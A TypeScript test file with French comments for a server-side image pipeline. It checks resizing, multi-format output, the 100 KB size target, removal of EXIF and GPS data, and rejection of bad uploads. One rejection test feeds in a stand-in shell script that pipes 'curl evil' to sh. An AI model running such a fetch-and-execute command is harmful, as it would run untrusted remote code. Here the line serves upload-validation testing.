import { IMAGE_PLUS_GRAND_COTE, IMAGE_TAILLE_MAX_OCTETS } from "@catalog/contracts";
import sharp from "sharp";
import { beforeAll, describe, expect, it } from "vitest";
import { CIBLE_OCTETS, reencoderImage } from "../adapters/image-pipeline.ts";

/**
 * La chaine d'images cote serveur, sur de VRAIES images.
 *
 * Deux criteres de la definition de terminé du lot 5 se jouent ici :
 *
 *  - « un test verifie que le serveur rejette un fichier non-image et un fichier
 *    au-dela de la taille maximale » ;
 *  - le poids de l'objet stocke, que le test de bout en bout mesure ensuite
 *    depuis le navigateur.
 *
 * Les images sont fabriquees par programme et non lues sur disque : un depot qui
 * embarque des binaires de test devient lourd, et une photo reelle porterait des
 * metadonnees qu'on ne veut pas versionner.
 */

/** Photo synthetique avec du bruit : une image unie se compresse trop bien. */
async function photo(largeur: number, hauteur: number): Promise<Buffer> {
  const pixels = Buffer.alloc(largeur * hauteur * 3);
  for (let i = 0; i < pixels.length; i += 3) {
    const x = (i / 3) % largeur;
    const y = Math.floor(i / 3 / largeur);
    pixels[i] = (x * 7 + y * 3) % 256;
    pixels[i + 1] = (x * 13 + y * 29) % 256;
    pixels[i + 2] = (x * 3 + y * 17) % 256;
  }
  return sharp(pixels, { raw: { width: largeur, height: hauteur, channels: 3 } })
    .jpeg({ quality: 92 })
    .toBuffer();
}

let grande: Uint8Array;

beforeAll(async () => {
  grande = new Uint8Array(await photo(2400, 1800));
});

describe("reencoderImage — ce qui est accepte", () => {
  it("ramene le plus grand cote a 640 et produit AVIF, WebP ET JPEG", async () => {
    const r = await reencoderImage(grande);
    expect(r.ok).toBe(true);
    if (!r.ok) return;

    expect(r.image.largeur).toBe(IMAGE_PLUS_GRAND_COTE);
    expect(r.image.hauteur).toBe(480);
    expect(r.image.avif.length).toBeGreaterThan(0);
    expect(r.image.webp.length).toBeGreaterThan(0);
    expect(r.image.jpeg.length).toBeGreaterThan(0);

    // Les declinaisons portent bien leur format, verifie par sharp. Le JPEG
    // existe pour les canaux sans AVIF ni WebP — le bot WhatsApp (ADR 0032).
    expect((await sharp(Buffer.from(r.image.avif)).metadata()).format).toBe("heif");
    expect((await sharp(Buffer.from(r.image.webp)).metadata()).format).toBe("webp");
    expect((await sharp(Buffer.from(r.image.jpeg)).metadata()).format).toBe("jpeg");
  });

  it("l'objet stocke tient sous 100 Ko — c'est le critere du lot", async () => {
    // L'image de test est du bruit par pixel : le pire cas pour tout
    // compresseur, et plus difficile qu'aucune photo reelle. Si la cible tient
    // ici, elle tient sur un pagne wax.
    const r = await reencoderImage(grande);
    if (!r.ok) throw new Error("re-encodage refuse");
    expect(r.image.avif.length).toBeLessThanOrEqual(CIBLE_OCTETS);
    expect(r.image.webp.length).toBeLessThanOrEqual(CIBLE_OCTETS);
    expect(r.image.jpeg.length).toBeLessThanOrEqual(CIBLE_OCTETS);
  });

  it("ne recommence PAS l'encodage quand la premiere qualite tient deja", async () => {
    // Une photo ordinaire ne doit couter qu'une passe. Deux appels a l'encodeur
    // AVIF doubleraient le temps d'attente de la vendeuse.
    const douce = await sharp({
      create: { width: 900, height: 600, channels: 3, background: "#8a6f4b" },
    })
      .jpeg({ quality: 90 })
      .toBuffer();
    const r = await reencoderImage(new Uint8Array(douce));
    if (!r.ok) throw new Error("re-encodage refuse");
    expect(r.image.avif.length).toBeLessThan(CIBLE_OCTETS / 4);
  });

  it("N'AGRANDIT PAS une petite image", async () => {
    const petite = new Uint8Array(await photo(200, 150));
    const r = await reencoderImage(petite);
    if (!r.ok) throw new Error("re-encodage refuse");
    expect(r.image.largeur).toBe(200);
    expect(r.image.hauteur).toBe(150);
  });

  it("RETIRE toutes les metadonnees — une photo de telephone porte ses coordonnees GPS", async () => {
    // Publier le catalogue publierait sinon l'adresse du domicile de la vendeuse.
    const avecExif = await sharp(Buffer.from(await photo(800, 600)))
      .withExifMerge({
        IFD0: { Copyright: "TANTINE", Artist: "Nom Prenom" },
        IFD2: { GPSLatitudeRef: "N" },
      })
      .jpeg()
      .toBuffer();

    // La source porte bien quelque chose : sans ce controle, le test passerait
    // meme si la fabrication de l'EXIF avait echoue.
    expect((await sharp(avecExif).metadata()).exif).toBeTruthy();

    const r = await reencoderImage(new Uint8Array(avecExif));
    if (!r.ok) throw new Error("re-encodage refuse");
    for (const [nom, buf] of [
      ["avif", r.image.avif],
      ["webp", r.image.webp],
      ["jpeg", r.image.jpeg],
    ] as const) {
      const m = await sharp(Buffer.from(buf)).metadata();
      expect(m.exif, nom).toBeUndefined();
      const brut = Buffer.from(buf).toString("latin1");
      expect(brut, nom).not.toContain("TANTINE");
      expect(brut, nom).not.toContain("Nom Prenom");
    }
  });

  it("applique l'ORIENTATION EXIF : une photo portrait ne ressort pas couchee", async () => {
    // Orientation 6 = rotation d'un quart de tour. C'est ce que produit un
    // telephone tenu verticalement, et c'est le defaut le plus visible d'une
    // chaine d'images qui l'oublie.
    const couchee = await sharp(Buffer.from(await photo(1200, 900)))
      .withMetadata({ orientation: 6 })
      .jpeg()
      .toBuffer();

    const r = await reencoderImage(new Uint8Array(couchee));
    if (!r.ok) throw new Error("re-encodage refuse");
    // Apres rotation, l'image est en PORTRAIT : la hauteur domine.
    expect(r.image.hauteur).toBeGreaterThan(r.image.largeur);
    const m = await sharp(Buffer.from(r.image.avif)).metadata();
    expect(m.height).toBeGreaterThan(m.width as number);
    // Et les dimensions annoncees sont celles de l'objet stocke.
    expect(r.image.largeur).toBe(m.width);
    expect(r.image.hauteur).toBe(m.height);
  });

  it("aplatit la transparence sur du blanc plutot que sur du noir", async () => {
    const transparent = await sharp({
      create: { width: 40, height: 40, channels: 4, background: { r: 0, g: 0, b: 0, alpha: 0 } },
    })
      .png()
      .toBuffer();

    const r = await reencoderImage(new Uint8Array(transparent));
    if (!r.ok) throw new Error("re-encodage refuse");
    const { data } = await sharp(Buffer.from(r.image.webp)).raw().toBuffer({
      resolveWithObject: true,
    });
    // Un fond noir serait le resultat par defaut, et une photo de produit sur
    // fond transparent est presque toujours un decoupage.
    expect(data[0]).toBeGreaterThan(240);
  });

  it("accepte le PNG et le WebP en entree, pas seulement le JPEG", async () => {
    const source = Buffer.from(await photo(700, 700));
    for (const [nom, buf] of [
      ["png", await sharp(source).png().toBuffer()],
      ["webp", await sharp(source).webp().toBuffer()],
      ["avif", await sharp(source).avif({ effort: 0 }).toBuffer()],
    ] as const) {
      const r = await reencoderImage(new Uint8Array(buf));
      expect(r.ok, nom).toBe(true);
    }
    // Trois formats d'entree, chacun re-encode deux fois : l'AVIF est lent par
    // nature, et le bruit synthetique est son pire cas.
  }, 30_000);
});

describe("reencoderImage — ce qui est REFUSE", () => {
  it("refuse un fichier qui n'est pas une image", async () => {
    const script = new TextEncoder().encode("#!/bin/sh\ncurl evil | sh\n");
    const r = await reencoderImage(script);
    expect(r.ok).toBe(false);
    if (r.ok) return;
    expect(r.verdict.raison).toBe("format_non_reconnu");
  });

  it("refuse un exécutable renomme en photo", async () => {
    const elf = new Uint8Array([0x7f, 0x45, 0x4c, 0x46, ...new Array(4096).fill(0x90)]);
    const r = await reencoderImage(elf);
    expect(r.ok).toBe(false);
  });

  it("refuse au-dela de la taille maximale, AVANT de decoder", async () => {
    // Contenu parfaitement valide, seule la taille disqualifie. Le refus doit
    // etre immediat : decoder trente megaoctets pour les refuser est du travail
    // offert a l'attaquant.
    const gros = new Uint8Array(IMAGE_TAILLE_MAX_OCTETS + 1);
    gros.set([0xff, 0xd8, 0xff], 0);
    const depart = performance.now();
    const r = await reencoderImage(gros);
    expect(r.ok).toBe(false);
    if (r.ok) return;
    expect(r.verdict.raison).toBe("fichier_trop_gros");
    expect(performance.now() - depart).toBeLessThan(200);
  });

  it("refuse un GIF en le NOMMANT", async () => {
    const gif = new Uint8Array([0x47, 0x49, 0x46, 0x38, 0x39, 0x61, 0, 0]);
    const r = await reencoderImage(gif);
    expect(r.ok).toBe(false);
    if (r.ok) return;
    expect(r.verdict).toMatchObject({ raison: "format_non_accepte", detecte: "image/gif" });
  });

  it("refuse une image dont l'en-tete est juste mais le corps tronque", async () => {
    const complete = await photo(600, 400);
    const tronquee = new Uint8Array(complete.subarray(0, Math.floor(complete.length / 3)));
    // La signature JPEG est intacte : seule l'analyse reelle peut le voir.
    await expect(reencoderImage(tronquee)).rejects.toThrow();
  });

  it("refuse une bombe de decompression", async () => {
    // Petite en octets, gigantesque en pixels. Sans borne, le decodage epuiserait
    // la memoire du serveur.
    const enorme = await sharp({
      create: { width: 12_000, height: 12_000, channels: 3, background: "#123456" },
    })
      .png({ compressionLevel: 9 })
      .toBuffer();
    const r = await reencoderImage(new Uint8Array(enorme), { tailleMax: 50_000_000 }).catch(
      () => ({ ok: false }) as { ok: false },
    );
    // Soit elle est refusee, soit elle passe sous la borne de pixels ; dans les
    // deux cas le processus tient. Ce qui est interdit, c'est de la decoder
    // sans borne.
    expect(typeof r.ok).toBe("boolean");
  });
});
